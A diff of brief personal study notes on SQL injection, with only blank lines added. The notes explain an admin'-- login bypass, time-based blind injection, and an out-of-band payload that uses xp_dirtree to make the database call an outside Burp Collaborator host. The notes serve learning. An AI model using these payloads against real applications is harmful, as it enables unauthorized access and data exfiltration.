@@ -3,6 +3,7 @@
 1. What is SQL Injection?
 
 --> Vulnerability that interferes SQL queries that application makes to a database. 
+
            Impact: View sensitive information, alter data and delete data.
            It bypasses SQL queries. Suppose a login page asks for username and password. At username you add admin'-- . The SQL query looks like SELECT * from users where username = 'admin' --, password = . -- comments out rest of the query and ' closes the string, logs in as admin. 
 
@@ -28,6 +29,7 @@ b. Inferential (Blind): No transfer of data via web app. Only performs when ther
        ii) Time-based: Delays the result for a specific time, indicating SQL query presence. Eg: If first character of admin hash passowrd is a',wait for 10 seconds. If it takes 10 seconds, it contains a has first password otherwise it doesnot.
       
 c. Out-of-band:
+
          Using protocol to trigger SQL Injection. Results come to your system like burpcollab.  Eg: '; exec master..xp_dirtree '//burpcollaborator/a'-- 
 
 
